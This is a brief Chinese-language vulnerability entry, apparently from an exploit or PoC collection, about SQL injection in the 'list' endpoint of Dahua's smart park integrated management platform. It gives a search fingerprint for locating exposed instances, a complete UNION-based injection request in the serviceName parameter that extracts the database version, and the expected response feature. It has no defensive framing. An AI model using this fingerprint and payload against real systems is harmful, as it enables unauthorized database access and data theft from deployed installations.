# 大华智慧园区综合管理平台list存在SQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`body="static/qwebchannel.js"`
- **请求**：`GET /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,VERSION(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1`
- **响应特征**：200 Service